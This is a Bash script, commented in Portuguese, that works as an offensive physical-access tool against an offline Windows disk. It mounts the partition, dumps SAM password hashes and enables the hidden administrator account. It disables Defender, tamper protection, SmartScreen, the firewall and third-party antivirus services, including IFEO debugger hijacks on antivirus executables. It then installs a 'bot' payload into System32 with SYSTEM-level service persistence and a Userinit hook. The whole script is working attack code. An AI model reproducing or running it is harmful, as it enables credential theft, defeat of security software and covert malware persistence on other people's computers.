#!/bin/bash

# --- CONFIGURAÇÕES ---
PAYLOAD="Windows.exe"
DEST_DIR="$HOME/Desktop/Post_Exploitation"
MOUNT_POINT="/mnt/win_target" # Ponto de montagem fixo para evitar erros de diretório

# Lista de serviços de segurança (AVs e Endpoints)
AV_SERVICES=("ekrn" "epfw" "avp" "avpckcl" "SmadavService" "Smadav" "SentinelAgent" "SepMasterService" "McAfeeFramework" "WinDefend" "mpssvc")

echo "[+] OPERAÇÃO OMNI: PERSISTÊNCIA SYSTEM & KILL TOTAL (AV/ENDPOINT)"

# 1. LOCALIZAÇÃO E MONTAGEM UNIVERSAL
echo "[*] Localizando partição Windows..."
sudo mkdir -p "$MOUNT_POINT"

# Busca automática por qualquer partição NTFS que contenha a pasta Windows
DISPOSITIVO=$(lsblk -pno NAME,FSTYPE | grep "ntfs" | awk '{print $1}' | while read dev; do
    sudo mount -o ro "$dev" "$MOUNT_POINT" 2>/dev/null
    if [ -d "$MOUNT_POINT/Windows/System32/config" ]; then
        sudo umount "$MOUNT_POINT"
        echo "$dev"
        break
    fi
    sudo umount "$MOUNT_POINT" 2>/dev/null
done)

if [ -z "$DISPOSITIVO" ]; then echo "[-] Erro: Disco Windows não encontrado."; exit 1; fi

# 2. REPARAÇÃO E MONTAGEM RW (FORÇADA)
echo "[*] Desbloqueando $DISPOSITIVO..."
sudo ntfsfix -d "$DISPOSITIVO" &>/dev/null
sudo mount -t ntfs-3g -o rw,remove_hiberfile "$DISPOSITIVO" "$MOUNT_POINT"

SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

mkdir -p "$DEST_DIR"

# 3. CAPTURA DE HASHES OFFLINE
echo "[*] Extraindo hashes locais (SAM)..."
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

# 4. ADMIN OCULTO & DEFENDER (MÉTODO HEREDOC - ANTI-KILLED)
echo "[*] Ativando Admin Oculto e destruindo Defender..."

# Admin RID 500
sudo chntpw -i "$SAM" <<EOF
cd Domains\\Account\\Users\\000001F4
ed F
11
q
y
EOF

# Defender, Tamper e Real-Time
sudo chntpw -e "$SOFTWARE" <<EOF
cd Microsoft\\Windows Defender
nv 4 DisableAntiSpyware
ed DisableAntiSpyware
1
cd Real-Time Protection
nv 4 DisableRealtimeMonitoring
ed DisableRealtimeMonitoring
1
cd ..\\Features
nv 4 TamperProtection
ed TamperProtection
0
q
y
EOF

# 5. SMART SCREEN & FIREWALL
echo "[*] Desativando SmartScreen e Firewall..."
sudo chntpw -e "$SOFTWARE" <<EOF
cd Microsoft\\Windows\\CurrentVersion\\Explorer
nv 4 SmartScreenEnabled
ed SmartScreenEnabled
Off
q
y
EOF

sudo chntpw -e "$SYSTEM" <<EOF
cd ControlSet001\\Services\\mpssvc
ed Start
4
q
y
EOF

# 6. NUKE AVs DE TERCEIROS (ESET, KASPERSKY, SMADAV)
echo "[*] Desativando serviços de Endpoints e Bloqueio IFEO..."
for svc in "${AV_SERVICES[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

for exe in "Smadav.exe" "avp.exe" "ekrn.exe"; do
    printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey $exe\ncd $exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
done

# 7. O MELHOR DOS DOIS MUNDOS: SYSTEM + USERINIT
echo "[*] Configurando persistência SYSTEM (UsoSvc) e Usuário (Userinit)..."

# Instância SYSTEM (Nível de privilégio máximo)
printf "cd ControlSet001\\\\Services\\\\UsoSvc\ned ImagePath\nC:\\\\Windows\\\\System32\\\\Windows.exe\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# Userinit como redundância
echo "[*] Usando a persistencia via (UserUnit)..."
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start $PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 8. DEPLOY FINAL
if [ -f "./$PAYLOAD" ]; then
    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Windows/System32/"
    sync
    echo "[!!!] OPERAÇÃO CONCLUÍDA COM SUCESSO."
    echo "[i] Bot em System32, Hashes em $DEST_DIR."
else
    echo "[-] Erro: Ficheiro $PAYLOAD não encontrado no diretório atual."
fi

sudo umount "$MOUNT_POINT"
